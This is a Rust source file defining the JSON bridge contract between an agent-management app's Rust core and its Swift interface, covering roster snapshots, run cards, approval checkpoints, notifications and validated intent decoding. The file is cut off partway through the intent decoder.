//! The wire contract with CorralNative (Swift) over the C ABI (ADR-001, docs/01 §2).
//!
//! Pure Rust with no FFI, so it builds and is tested on every platform. The shared fixtures in
//! `native/CorralNative/Fixtures/bridge` are tested from both sides (TP-BRIDGE-01..04), so a change
//! on one side fails the other's tests. The FFI itself lives in `native.rs`.

use corral_adapters::linked::{DotLook, LinkedApp, LinkedSettings};
use corral_core::controls::MAX_PROMPT_BYTES;
use corral_core::corral_view::{CorralView, DropState};
use corral_core::domain::{ActionClass, Risk};
use corral_core::ids::{AgentId, CheckpointId};
use corral_core::plan_view::{PlanView, SubtaskStatus};
use corral_core::prompt_bar::{BarView, How};
use corral_core::run_card::{
    CardAction, CardCheckpoint, CardField, CardStatus, EDIT_MAX_FIELDS, FIELD_KEY_MAX_CHARS,
    FieldKind, RunCard, RunCards,
};
use corral_core::trace_tree::{TraceColumn, TraceTree};
use corral_policy::{Approval, Scope};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

/// Must equal `corralNativeABIVersion` in `CorralBridge.swift`.
pub const ABI_VERSION: u32 = 3;
/// Version of the JSON payloads below.
pub const WIRE_VERSION: u32 = 1;
/// The corral never shows more than an octagon (docs/07 §3).
pub const MAX_SHOWN: usize = 8;
/// Must not exceed Swift's `CorralRoster.maxIDLength`.
pub const MAX_ID_LEN: usize = 64;
/// Largest intent payload Rust reads from Swift.
pub const MAX_INTENT_BYTES: usize = 16 * 1024;
/// Largest denial note Rust takes from a card; the desk keeps the first 1,000 characters.
pub const MAX_NOTE_BYTES: usize = 4 * 1024;
/// The longest key an edit may name: a field's key is at most `FIELD_KEY_MAX_CHARS` characters,
/// four bytes each at most.
pub const MAX_EDIT_KEY_BYTES: usize = 4 * FIELD_KEY_MAX_CHARS;

/// A ranked roster snapshot for the corral: what Rust sends (`roster-v1.json`), with each shown
/// drop's run card when it has one (`roster-cards-v1.json`, SK-6).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RosterSnapshot {
    v: u32,
    agents: Vec<RosterAgent>,
    hidden: u32,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    cards: Vec<CardSnapshot>,
    /// Which linked apps show, for the right-click menu (`roster-linked-v1.json`). Absent when
    /// nothing is linked.
    #[serde(skip_serializing_if = "Option::is_none")]
    links: Option<LinksSnapshot>,
    /// The trace tree above the corral (`roster-trace-v1.json`, docs/07 §8.3). Absent when
    /// nothing is running.
    #[serde(skip_serializing_if = "Option::is_none")]
    trace: Option<TraceSnapshot>,
}

/// The trace tree, as the core chose it ([`corral_core::trace_tree`]).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TraceSnapshot {
    /// At most 3 columns, in order.
    pub columns: Vec<ColumnSnapshot>,
    /// Running beyond those: "+N more running".
    pub more: usize,
}

/// One column: the prompt pill, the task card and the subtask stack.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ColumnSnapshot {
    /// The agent whose run it is; the wire ends at its drop or the hidden bead.
    pub id: AgentId,
    /// Its name, added by [`RosterSnapshot::with_column_names`].
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// Its logo file, added by [`RosterSnapshot::with_logos`] (ADR-015).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub logo: Option<String>,
    /// Queued, working or needs-you.
    pub status: CardStatusWire,
    /// The task.
    pub prompt: String,
    /// Whether the task was cut to fit.
    pub prompt_truncated: bool,
    /// The current subtask, once there is one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub subtask: Option<SubtaskSnapshot>,
    /// What's left after it, at most 2.
    pub next: Vec<String>,
}

/// The current subtask in a column: "Subtask 2 of 5".
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SubtaskSnapshot {
    /// Its place, from 1.
    pub step: usize,
    /// How many there are.
    pub total: usize,
    /// Its title (agent text).
    pub title: String,
}

impl From<&TraceColumn> for ColumnSnapshot {
    fn from(column: &TraceColumn) -> Self {
        Self {
            id: column.agent.clone(),
            name: None,
            logo: None,
            status: column.status.into(),
            prompt: column.prompt.as_str().to_owned(),
            prompt_truncated: column.prompt.is_truncated(),
            subtask: column.subtask.as_ref().map(|s| SubtaskSnapshot {
                step: s.step,
                total: s.total,
                title: s.title.as_str().to_owned(),
            }),
            next: column.next.iter().map(|t| t.as_str().to_owned()).collect(),
        }
    }
}

/// A card's progress (`roster-plan-v1.json`, TP-HOVER-03): a segment per subtask, and the
/// current one for the "Now:" line.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PlanSnapshot {
    /// The current subtask's place, from 1.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub step: Option<usize>,
    /// How many there are.
    pub total: usize,
    /// The current subtask's title (agent text).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub now: Option<String>,
    /// Each subtask's status, in order.
    pub segments: Vec<SegmentWire>,
}

/// A progress segment, as Swift's `CorralRunCard.Plan.Segment`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum SegmentWire {
    /// Not started.
    Pending,
    /// Being worked on.
    Current,
    /// Finished.
    Done,
    /// Dropped or denied.
    Skipped,
    /// Failed.
    Failed,
}

impl From<SubtaskStatus> for SegmentWire {
    fn from(status: SubtaskStatus) -> Self {
        match status {
            SubtaskStatus::Pending => Self::Pending,
            SubtaskStatus::Current => Self::Current,
            SubtaskStatus::Done => Self::Done,
            SubtaskStatus::Skipped => Self::Skipped,
            SubtaskStatus::Failed => Self::Failed,
        }
    }
}

impl PlanSnapshot {
    /// A card's progress, or `None` while the run has no subtasks.
    pub fn from_plan(plan: &PlanView) -> Option<Self> {
        if plan.total() == 0 {
            return None;
        }
        let current = plan.current();
        Some(Self {
            step: current.map(|(at, _)| at + 1),
            total: plan.total(),
            now: current.map(|(_, s)| s.title.as_str().to_owned()),
            segments: plan.subtasks().iter().map(|s| s.status.into()).collect(),
        })
    }
}

/// Which linked apps show (ADR-005).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct LinksSnapshot {
    /// Muse's drop shows.
    pub muse: bool,
    /// Your dot's look, when its drop shows.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dot: Option<&'static str>,
}

/// What a drop's hover card and result card show, from the core's [`RunCard`]. Text is already
/// cleaned and capped; Swift bounds it again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CardSnapshot {
    /// The drop the card belongs to.
    pub id: AgentId,
    /// Where the run stands.
    pub status: CardStatusWire,
    /// The task.
    pub prompt: String,
    /// Whether the task was cut to fit.
    pub prompt_truncated: bool,
    /// Elapsed time, from the core's clock.
    pub elapsed_ms: u64,
    /// Spend so far, in dollars.
    pub spend: String,
    /// The answer (agent text), once there is one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub answer: Option<String>,
    /// Whether the answer was cut to fit.
    pub answer_truncated: bool,
    /// Why the run failed.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    /// The card's buttons, in order.
    pub actions: Vec<CardActionWire>,
    /// The approval box, while a checkpoint waits (M2).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub checkpoint: Option<CheckpointSnapshot>,
    /// The run's progress, once it has subtasks; added by [`RosterSnapshot::with_plans`].
    #[serde(skip_serializing_if = "Option::is_none")]
    pub plan: Option<PlanSnapshot>,
}

/// A waiting checkpoint, from the core's `checkpoint.opened` only. Swift draws the approval box
/// from these fields and nothing else (docs/07 §8.2).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CheckpointSnapshot {
    /// The checkpoint's single-use ID: an answer must carry it.
    pub id: CheckpointId,
    /// The action class, as the policy names it (`comms.send`).
    pub class: ActionClass,
    /// The risk tier: `normal`, `high` or `critical`.
    pub risk: Risk,
    /// The core's title.
    pub title: String,
    /// The exact detail: tool, destination, arguments.
    pub detail: String,
    /// Whether the core cut the detail to fit.
    pub detail_truncated: bool,
    /// The call's arguments as fields, when the card may edit them (TP-CHK-13). Swift's edit
    /// sheet draws these and sends back only what changed.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub fields: Option<Vec<FieldSnapshot>>,
}

impl From<&CardCheckpoint> for CheckpointSnapshot {
    fn from(checkpoint: &CardCheckpoint) -> Self {
        Self {
            id: checkpoint.id.clone(),
            class: checkpoint.class,
            risk: checkpoint.risk,
            title: checkpoint.title.as_str().to_owned(),
            detail: checkpoint.detail.as_str().to_owned(),
            detail_truncated: checkpoint.detail.is_truncated(),
            fields: None,
        }
    }
}

/// One argument on the edit sheet, from the core's `RunCard.edit`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct FieldSnapshot {
    /// The argument's key: an edit names it.
    pub key: String,
    /// The key as words.
    pub label: String,
    /// `text`, `number` or `fixed` (shown, not editable).
    pub kind: FieldKindWire,
    /// The value as text.
    pub value: String,
}

/// What the sheet may do with a field, as Swift's `CorralRunCard.Field.Kind`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum FieldKindWire {
    /// Editable text.
    Text,
    /// An editable number.
    Number,
    /// Read-only.
    Fixed,
}

impl From<&CardField> for FieldSnapshot {
    fn from(field: &CardField) -> Self {
        Self {
            key: field.key.clone(),
            label: field.label.clone(),
            kind: match field.kind {
                FieldKind::Text => FieldKindWire::Text,
                FieldKind::Number => FieldKindWire::Number,
                FieldKind::Fixed => FieldKindWire::Fixed,
            },
            value: field.value.clone(),
        }
    }
}

/// A card's status, as Swift's `CorralRunCard.Status`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum CardStatusWire {
    /// Waiting for a slot.
    Queued,
    /// Working.
    Working,
    /// Waiting on a checkpoint.
    NeedsYou,
    /// Finished.
    Done,
    /// Failed.
    Error,
    /// Stopped.
    Stopped,
}

/// A card's button, as Swift's `CorralRunCard.Action`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum CardActionWire {
    /// Stop.
    Stop,
    /// Send back.
    SendBack,
    /// New task.
    NewTask,
    /// Retry.
    Retry,
    /// Approve the waiting checkpoint.
    Approve,
    /// Deny the waiting checkpoint.
    Deny,
}

impl From<CardStatus> for CardStatusWire {
    fn from(status: CardStatus) -> Self {
        match status {
            CardStatus::Queued => Self::Queued,
            CardStatus::Working => Self::Working,
            CardStatus::NeedsYou => Self::NeedsYou,
            CardStatus::Done => Self::Done,
            CardStatus::Error => Self::Error,
            CardStatus::Stopped => Self::Stopped,
        }
    }
}

impl From<CardAction> for CardActionWire {
    fn from(action: CardAction) -> Self {
        match action {
            CardAction::Stop => Self::Stop,
            CardAction::SendBack => Self::SendBack,
            CardAction::NewTask => Self::NewTask,
            CardAction::Retry => Self::Retry,
            CardAction::Approve => Self::Approve,
            CardAction::Deny => Self::Deny,
        }
    }
}

impl From<&RunCard> for CardSnapshot {
    fn from(card: &RunCard) -> Self {
        Self {
            id: card.agent.clone(),
            status: card.status.into(),
            prompt: card.prompt.as_str().to_owned(),
            prompt_truncated: card.prompt.is_truncated(),
            elapsed_ms: card.elapsed_ms,
            spend: card.spend.clone(),
            answer: card.answer.as_ref().map(|a| a.as_str().to_owned()),
            answer_truncated: card.answer.as_ref().is_some_and(|a| a.is_truncated()),
            error: card.error.as_ref().map(|e| e.as_str().to_owned()),
            actions: card.actions.iter().map(|a| (*a).into()).collect(),
            checkpoint: card
                .checkpoint
                .as_ref()
                .map(|checkpoint| CheckpointSnapshot {
                    fields: card
                        .edit
                        .as_ref()
                        .map(|fields| fields.iter().map(FieldSnapshot::from).collect()),
                    ..CheckpointSnapshot::from(checkpoint)
                }),
            plan: None,
        }
    }
}

/// One drop in the corral.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RosterAgent {
    /// Agent identity.
    pub id: AgentId,
    /// Display name, for the hover card and VoiceOver.
    pub name: String,
    /// One to three characters drawn on the drop.
    pub monogram: String,
    /// What the drop shows.
    pub status: DropStatus,
    /// The provider's logo in Corral's logos folder, when there's one (ADR-015). Swift checks
    /// the path again and falls back to the monogram.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub logo: Option<String>,
    /// For a linked app's drop (ADR-005), the app it opens in. Its card has only Open.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub linked: Option<&'static str>,
}

/// Drop status, as Swift's `CorralAgentToken.Status`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum DropStatus {
    /// In the corral, ready to deploy.
    Available,
    /// Deployed and running.
    Working,
    /// Waiting on a checkpoint.
    NeedsYou,
    /// Finished; can be prompted again or returned.
    Done,
    /// Failed.
    Error,
}

impl RosterSnapshot {
    /// Builds a snapshot from agents already sorted most used first. Shows the first
    /// [`MAX_SHOWN`] and counts the rest as hidden. Swift bounds it again (it trusts nothing).
    pub fn ranked(mut agents: Vec<RosterAgent>) -> Self {
        let hidden = agents.len().saturating_sub(MAX_SHOWN);
        agents.truncate(MAX_SHOWN);
        Self {
            v: WIRE_VERSION,
            agents,
            hidden: u32::try_from(hidden).unwrap_or(u32::MAX),
            cards: Vec::new(),
            links: None,
            trace: None,
        }
    }

    /// The roster for the core's view, with the run card of each shown drop at `now_ms` (SK-6).
    pub fn with_cards(view: &CorralView, cards: &RunCards, now_ms: u64) -> Self {
        let mut snapshot = Self::from(view);
        snapshot.cards = snapshot
            .agents
            .iter()
            .filter_map(|agent| cards.card(&agent.id, now_ms))
            .map(|card| CardSnapshot::from(&card))
            .collect();
        snapshot
    }

    /// Marks linked apps' drops and says which linked apps show (ADR-005).
    pub fn with_linked(mut self, settings: &LinkedSettings) -> Self {
        for agent in &mut self.agents {
            agent.linked = LinkedApp::from_agent(&agent.id).map(LinkedApp::app_name);
        }
        self.links = (!settings.is_empty()).then(|| LinksSnapshot {
            muse: settings.muse,
            dot: settings.dot.map(DotLook::id),
        });
        self
    }

    /// Adds each card's progress, from the run its card follows (TP-HOVER-03).
    pub fn with_plans(mut self, cards: &RunCards) -> Self {
        for card in &mut self.cards {
            card.plan = cards.plan(&card.id).and_then(PlanSnapshot::from_plan);
        }
        self
    }

    /// Adds the trace tree, when anything is running (docs/07 §8.3, TP-TRACE-02, TP-TRACE-06).
    pub fn with_trace(mut self, tree: &TraceTree) -> Self {
        self.trace = (!tree.columns.is_empty()).then(|| TraceSnapshot {
            columns: tree.columns.iter().map(ColumnSnapshot::from).collect(),
            more: tree.more,
        });
        self
    }

    /// Adds each shown drop's logo path, from `logo_for` (ADR-015).
    pub fn with_logos(mut self, logo_for: impl Fn(&AgentId) -> Option<String>) -> Self {
        for agent in &mut self.agents {
            agent.logo = logo_for(&agent.id);
        }
        // The trace tree's task cards too: hidden agents have columns but no drop.
        for column in self.trace.iter_mut().flat_map(|t| t.columns.iter_mut()) {
            column.logo = logo_for(&column.id);
        }
        self
    }

    /// Adds each trace column's agent name, from `name_for`: a hidden agent has a column but no
    /// drop, so the roster's agents don't name it (TP-TRACE-02).
    pub fn with_column_names(mut self, name_for: impl Fn(&AgentId) -> Option<String>) -> Self {
        for column in self.trace.iter_mut().flat_map(|t| t.columns.iter_mut()) {
            column.name = name_for(&column.id);
        }
        self
    }

    /// The JSON bytes passed to `corral_native_set_roster`.
    pub fn to_bytes(&self) -> Result<Vec<u8>, BridgeError> {
        serde_json::to_vec(self).map_err(BridgeError::Encode)
    }
}

impl From<&CorralView> for RosterSnapshot {
    /// The roster for the core's view (SK-2b). The core already chose the shown set and its
    /// order; this only translates it to the wire.
    fn from(view: &CorralView) -> Self {
        let agents: Vec<RosterAgent> = view
            .drops
            .iter()
            .map(|drop| RosterAgent {
                id: drop.agent.id.clone(),
                name: drop.agent.name.clone(),
                monogram: drop.agent.monogram.clone(),
                status: DropStatus::from(drop.state),
                logo: None,
                linked: None,
            })
            .collect();
        let extra = agents.len().saturating_sub(MAX_SHOWN);
        let mut snapshot = Self::ranked(agents);
        snapshot.hidden = u32::try_from(view.hidden.saturating_add(extra)).unwrap_or(u32::MAX);
        snapshot
    }
}

impl From<DropState> for DropStatus {
    fn from(state: DropState) -> Self {
        match state {
            DropState::Available => Self::Available,
            DropState::Working => Self::Working,
            DropState::NeedsYou => Self::NeedsYou,
            DropState::Done => Self::Done,
            DropState::Error => Self::Error,
        }
    }
}

/// A checkpoint notification for Swift to post (`notify-v1.json`). Rust chooses the buttons:
/// high and critical risks get no inline Approve (docs/01 "Notifications"); Swift only draws them.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct NotificationRequest {
    v: u32,
    checkpoint: CheckpointId,
    nonce: String,
    agent: AgentId,
    title: String,
    body: String,
    actions: Vec<Offer>,
}

/// A button on a checkpoint notification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Offer {
    /// Approve inline (low and medium risk only).
    Approve,
    /// Deny inline.
    Deny,
    /// Open the agent's hover card.
    Open,
}

impl NotificationRequest {
    /// A notification for `checkpoint`; `nonce` is its single-use approval nonce (T18).
    pub fn new(
        checkpoint: CheckpointId,
        nonce: impl Into<String>,
        agent: AgentId,
        title: impl Into<String>,
        body: impl Into<String>,
        actions: Vec<Offer>,
    ) -> Self {
        Self {
            v: WIRE_VERSION,
            checkpoint,
            nonce: nonce.into(),
            agent,
            title: title.into(),
            body: body.into(),
            actions,
        }
    }

    /// The JSON bytes passed to `corral_native_notify`.
    pub fn to_bytes(&self) -> Result<Vec<u8>, BridgeError> {
        serde_json::to_vec(self).map_err(BridgeError::Encode)
    }
}

/// A Touch ID prompt for Swift to show (`authenticate-v1.json`). The answer comes back as
/// [`Intent::AuthResult`] with the same `request`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AuthRequest {
    v: u32,
    request: String,
    reason: String,
}

impl AuthRequest {
    /// `reason` completes macOS's sentence "Corral is trying to …".
    pub fn new(request: impl Into<String>, reason: impl Into<String>) -> Self {
        Self {
            v: WIRE_VERSION,
            request: request.into(),
            reason: reason.into(),
        }
    }

    /// The JSON bytes passed to `corral_native_authenticate`.
    pub fn to_bytes(&self) -> Result<Vec<u8>, BridgeError> {
        serde_json::to_vec(self).map_err(BridgeError::Encode)
    }
}

/// The prompt bar's text as Swift reports it (docs/07 §6.1, TP-BAR-08): already bounded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BarEdit {
    /// Swift's number for this edit; the answer echoes it, so Swift can drop an older one.
    pub seq: u32,
    /// The text, within the core's prompt limit.
    pub text: String,
    /// Where the cursor is, in UTF-8 bytes: inside the text, on a character.
    pub cursor: usize,
    /// The drops ⌘-clicked in the corral: at most 8 valid IDs, each once.
    pub selection: Vec<AgentId>,
}

/// How a prompt bar send went.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BarOutcome {
    /// Every agent got it: the bar closes.
    Sent,
    /// Some did and some didn't: the bar stays open with this, its text cleared.
    Note(String),
    /// Nothing was sent: the bar stays open with this, its text kept.
    Refused(String),
}

#[derive(Serialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
enum BarOutcomeWire<'a> {
    Sent,
    Note { text: &'a str },
    Refused { text: &'a str },
}

impl Serialize for BarOutcome {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        match self {
            Self::Sent => BarOutcomeWire::Sent,
            Self::Note(text) => BarOutcomeWire::Note { text },
            Self::Refused(text) => BarOutcomeWire::Refused { text },
        }
        .serialize(serializer)
    }
}

/// What the prompt bar shows, for an edit or after a send (`prompt-bar-v1.json`,
/// `corral_native_prompt_bar`). The core decides all of it; Swift bounds it again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PromptBarSnapshot {
    v: u32,
    seq: u32,
    view: BarView,
    #[serde(skip_serializing_if = "Option::is_none")]
    outcome: Option<BarOutcome>,
}

impl PromptBarSnapshot {
    /// The answer to edit or send `seq`.
    pub fn new(seq: u32, view: BarView, outcome: Option<BarOutcome>) -> Self {
        Self {
            v: WIRE_VERSION,
            seq,
            view,
            outcome,
        }
    }

    /// The edit or send it answers.
    pub fn seq(&self) -> u32 {
        self.seq
    }

    /// What the bar shows.
    pub fn view(&self) -> &BarView {
        &self.view
    }

    /// How a send went; `None` for an edit.
    pub fn outcome(&self) -> Option<&BarOutcome> {
        self.outcome.as_ref()
    }

    /// Adds each suggested agent's logo path, from `logo_for` (ADR-015, TP-BAR-10).
    pub fn with_logos(mut self, logo_for: impl Fn(&AgentId) -> Option<String>) -> Self {
        for row in &mut self.view.suggestions {
            row.logo = logo_for(&AgentId::from(row.id.as_str()));
        }
        self
    }

    /// The JSON bytes passed to `corral_native_prompt_bar`.
    pub fn to_bytes(&self) -> Result<Vec<u8>, BridgeError> {
        serde_json::to_vec(self).map_err(BridgeError::Encode)
    }
}

/// What the user did in the corral, as reported by Swift. Typed, never a raw string (TP-BRIDGE-02).
/// Swift only reports; Rust decides what happens (AGENTS.md rule 3).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Intent {
    /// The user clicked a drop.
    OpenAgent(AgentId),
    /// The user deployed a group (Command-click selection).
    Deploy(Vec<AgentId>),
    /// The user asked for the prompt bar.
    SummonPromptBar,
    /// The user clicked a button on (or dismissed) a checkpoint notification. Rust checks the
    /// nonce and the risk before anything is approved.
    NotificationAction {
        /// The checkpoint the notification was for.
        checkpoint: CheckpointId,
        /// The nonce it carried; must match the checkpoint's current one.
        nonce: String,
        /// What the user clicked.
        action: NoteAction,
    },
    /// A checkpoint notification couldn't be shown; fall back to the hover card.
    NotificationFailed {
        /// The checkpoint it was for.
        checkpoint: CheckpointId,
        /// Why.
        reason: NoteFailure,
    },
    /// The answer to an [`AuthRequest`].
    AuthResult {
        /// The request it answers.
        request: String,
        /// What happened.
        outcome: AuthOutcome,
    },
    /// The user gave a drop a task (SK-6). The core checks the prompt.
    DeployTask {
        /// The drop.
        agent: AgentId,
        /// The task, as typed.
        prompt: String,
    },
    /// Stop on a card.
    Stop(AgentId),
    /// Send back on a card.
    SendBack(AgentId),
    /// Retry on a card.
    Retry(AgentId),
    /// Show a linked app's drop, from the right-click menu (ADR-005).
    ShowLinked {
        /// The app.
        app: LinkedApp,
        /// Your dot's look.
        look: Option<DotLook>,
    },
    /// Take a linked app's drop away.
    HideLinked(LinkedApp),
    /// Open on a linked drop's card.
    OpenLinked(LinkedApp),
    /// Stop all agents, from the right-click menu (Recall-all).
    StopAll,
    /// The corral turned idle (true) or busy (false): no hover, no card opening or open. Rust
    /// applies a waiting usage order only while it's idle (TP-USAGE-10).
    CorralIdle(bool),
    /// Approve on a card's approval box. The policy checks the gesture; a card only ever
    /// reports a click or a key (never Touch ID or voice).
    ApproveCheckpoint {
        /// The drop whose card it was.
        agent: AgentId,
        /// The checkpoint shown, by its single-use ID.
        checkpoint: CheckpointId,
        /// This call only, or the rest of the run.
        scope: Scope,
        /// The gesture.
        how: Approval,
    },
    /// Deny on a card's approval box, with an optional note for the agent.
    DenyCheckpoint {
        /// The drop whose card it was.
        agent: AgentId,
        /// The checkpoint shown.
        checkpoint: CheckpointId,
        /// What to tell the agent.
        note: Option<String>,
    },
    /// Approve a critical checkpoint with Touch ID: the card asks, Rust has Swift's prompt ask
    /// macOS, and the result comes back as [`Intent::AuthResult`] (TP-CHK-18).
    ApproveWithTouchId {
        /// The drop whose card it was.
        agent: AgentId,
        /// The checkpoint shown.
        checkpoint: CheckpointId,
    },
    /// Approve the edited call from a card's edit sheet: the fields the user changed, key to the
    /// text typed. The core merges them into the agent's arguments and checks them; the policy
    /// checks the gesture.
    EditCheckpoint {
        /// The drop whose card it was.
        agent: AgentId,
        /// The checkpoint shown.
        checkpoint: CheckpointId,
        /// The changed fields.
        changes: BTreeMap<String, String>,
        /// The gesture.
        how: Approval,
    },
    /// The prompt bar's text or cursor changed: Rust answers with what it shows.
    PromptBarEdited(BarEdit),
    /// Return or Deploy all in the prompt bar: Rust decides who it goes to and sends it.
    PromptBarSend {
        /// The text and selection (the cursor is at the end).
        edit: BarEdit,
        /// Return, or Deploy all.
        how: How,
    },
}

/// How a card's Approve was pressed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
enum CardGesture {
    Click,
    Keyboard,
}

/// How long a card's approval lasts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
enum ScopeWire {
    Once,
    ForRun,
}

/// A click on a checkpoint notification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum NoteAction {
    /// The inline Approve button.
    Approve,
    /// The inline Deny button.
    Deny,
    /// Open, or a click on the notification itself.
    Open,
    /// Dismissed without choosing.
    Dismiss,
}

/// Why a checkpoint notification wasn't shown.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum NoteFailure {
    /// The user hasn't allowed Corral's notifications.
    NotAuthorized,
    /// macOS refused it.
    Failed,
}

/// The result of a Touch ID prompt.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AuthOutcome {
    /// Authenticated.
    Ok,
    /// Cancelled by the user or the system.
    Cancelled,
    /// Didn't match.
    Failed,
    /// No Touch ID on this Mac, or none enrolled.
    Unavailable,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct IntentEnvelope {
    v: u32,
    intent: IntentWire,
}

#[derive(Deserialize)]
#[serde(tag = "kind", rename_all = "camelCase", deny_unknown_fields)]
enum IntentWire {
    OpenAgent {
        id: String,
    },
    Deploy {
        ids: Vec<String>,
    },
    SummonPromptBar,
    NotificationAction {
        checkpoint: String,
        nonce: String,
        action: NoteAction,
    },
    NotificationFailed {
        checkpoint: String,
        reason: NoteFailure,
    },
    AuthResult {
        request: String,
        outcome: AuthOutcome,
    },
    DeployTask {
        id: String,
        prompt: String,
    },
    Stop {
        id: String,
    },
    SendBack {
        id: String,
    },
    Retry {
        id: String,
    },
    ShowLinked {
        id: String,
        #[serde(default)]
        look: Option<String>,
    },
    HideLinked {
        id: String,
    },
    OpenLinked {
        id: String,
    },
    StopAll {},
    CorralIdle {
        idle: bool,
    },
    ApproveCheckpoint {
        id: String,
        checkpoint: String,
        scope: ScopeWire,
        how: CardGesture,
    },
    DenyCheckpoint {
        id: String,
        checkpoint: String,
        #[serde(default)]
        note: Option<String>,
    },
    EditCheckpoint {
        id: String,
        checkpoint: String,
        changes: BTreeMap<String, String>,
        how: CardGesture,
    },
    ApproveWithTouchId {
        id: String,
        checkpoint: String,
    },
    PromptBarEdited {
        seq: u32,
        text: String,
        cursor: u64,
        selection: Vec<String>,
    },
    PromptBarSend {
        seq: u32,
        text: String,
        selection: Vec<String>,
        all: bool,
    },
}

/// Why something crossing the bridge was refused.
#[derive(Debug, thiserror::Error)]
pub enum BridgeError {
    /// Swift passed a null pointer.
    #[error("null intent pointer")]
    Null,
    /// Payload over [`MAX_INTENT_BYTES`].
    #[error("intent is {0} bytes; the limit is {MAX_INTENT_BYTES}")]
    TooLarge(usize),
    /// Not valid intent JSON (unknown kind, unknown field, wrong type).
    #[error("malformed intent: {0}")]
    Malformed(#[from] serde_json::Error),
    /// A payload version this build doesn't speak.
    #[error("intent wire version {0}; this build speaks {WIRE_VERSION}")]
    Version(u32),
    /// An ID that is empty, too long or has control characters.
    #[error("invalid id")]
    BadId,
    /// A deploy with no agents or more than [`MAX_SHOWN`].
    #[error("deploy names {0} agents; expected 1 to {MAX_SHOWN}")]
    BadGroup(usize),
    /// A task over the core's prompt limit.
    #[error("task is {0} bytes; the limit is {MAX_PROMPT_BYTES}")]
    PromptTooLong(usize),
    /// A linked app or look this build doesn't know, or a look for an app that has none.
    #[error("unknown linked app or look")]
    BadLinked,
    /// A denial note over [`MAX_NOTE_BYTES`].
    #[error("note is {0} bytes; the limit is {MAX_NOTE_BYTES}")]
    NoteTooLong(usize),
    /// An edit changing no fields or more than the card can show, or naming a key no field can
    /// have.
    #[error(
        "an edit must change 1 to {EDIT_MAX_FIELDS} fields, each with a key of at most {MAX_EDIT_KEY_BYTES} bytes"
    )]
    BadEdit,
    /// A roster that couldn't be encoded.
    #[error("roster encode failed: {0}")]
    Encode(serde_json::Error),
}

/// Decodes and validates intent bytes from Swift.
pub fn decode_intent(bytes: &[u8]) -> Result<Intent, BridgeError> {
    if bytes.len() > MAX_INTENT_BYTES {
        return Err(BridgeError::TooLarge(bytes.len()));
    }
    let envelope: IntentEnvelope = serde_json::from_slice(bytes)?;
    if envelope.v != WIRE_VERSION {
        return Err(BridgeError::Version(envelope.v));
    }
    match envelope.intent {
        IntentWire::OpenAgent { id } => Ok(Intent::OpenAgent(agent_id(id)?)),
        IntentWire::Deploy { ids } => {
            if ids.is_empty() || ids.len() > MAX_SHOWN {
                return Err(BridgeError::BadGroup(ids.len()));
            }
            let mut agents: Vec<AgentId> = Vec::with_capacity(ids.len());
            for id in ids {
                let id = agent_id(id)?;
                if !agents.contains(&id) {
                    agents.push(id);
                }
            }
            Ok(Intent::Deploy(agents))
        }
        IntentWire::SummonPromptBar => Ok(Intent::SummonPromptBar),
        IntentWire::NotificationAction {
            checkpoint,
            nonce,
            action,
        } => Ok(Intent::NotificationAction {
            checkpoint: CheckpointId::from(ident(checkpoint)?),
            nonce: ident(nonce)?,
            action,
        }),
        IntentWire::NotificationFailed { checkpoint, reason } => Ok(Intent::NotificationFailed {
